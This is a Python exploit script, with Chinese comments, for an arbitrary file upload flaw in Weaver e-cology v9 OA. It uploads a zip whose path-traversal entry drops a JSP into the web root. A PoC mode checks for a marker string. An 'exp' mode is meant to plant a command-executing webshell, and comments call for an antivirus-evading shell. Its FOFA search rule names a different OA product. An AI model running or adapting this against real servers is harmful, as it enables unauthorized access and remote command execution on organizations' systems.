#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import zipfile
import io
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# 脚本信息
######################################################
NAME='Weaver_e_cology_v9_file_upload'
AUTHOR="境心"
REMARK='泛微OA weaver.common.Ctrl 任意文件上传漏洞'
FOFA_RULE='app="TDXK-通达OA"'
######################################################

def poc_zip():
    poc_name = '../../../test.jsp'
    content = """<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<% out.print("this is a friendly test, Please check and repair upload vulnerabilities.");
%>"""
    mem_string = io.BytesIO()
    zfile = zipfile.ZipFile(mem_string, 'w', zipfile.ZIP_DEFLATED, allowZip64=False)
    zfile.writestr(poc_name, content)
    zfile.close()
    mem_string.seek(0)
    return mem_string

def exp_zip():
    exp_name = '../../../test1.jsp'
    # 放shell内容，要免杀或者命令shell
    content = """"""
    mem_string = io.BytesIO()
    zfile = zipfile.ZipFile(mem_string, 'w', zipfile.ZIP_DEFLATED, allowZip64=False)
    zfile.writestr(exp_name, content)
    zfile.close()
    mem_string.seek(0)
    return mem_string

def poc(target,exp=None):
    result = {}
    target_url = target + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    if exp == None:
        mem_string = poc_zip()
        GetShellurl = target + '/cloudstore/test.jsp'
    elif exp == "exp":
        mem_string = exp_zip()
        GetShellurl = target + '/cloudstore/test1.jsp'
    file = [('file1', ('test.zip', mem_string.read(), 'application/zip'))]
    requests.post(url=target_url,files=file,timeout=5, verify=False)
    shell_res = requests.get(url = GetShellurl)
    GetShell_res = shell_res.text
    GetShell_res_code = shell_res.status_code
    if exp == "exp" and GetShell_res_code == 200:
        print("webshell地址为: "+GetShellurl)
    elif GetShell_res_code == 200 and "this is a friendly test" in GetShell_res:
        result['poc_url'] = GetShellurl
        result['message'] = "存在任意文件上传漏洞"
        result['poc'] = NAME
        return result
        # print('利用成功webshell地址为:'+GetShellurl)
    elif GetShell_res_code == 200 and "this is a friendly test" not in GetShell_res:
        result['poc_url'] = GetShellurl
        result['message'] = "存在上传漏洞但无法访问文件"
        result['poc'] = NAME
        return result

if __name__ == '__main__':
    # poc
    poc("http://127.0.0.1")
    # exp 传的是个能命令执行的webshell，POST传参cmd=命令
    # poc("http://127.0.0.1", "exp")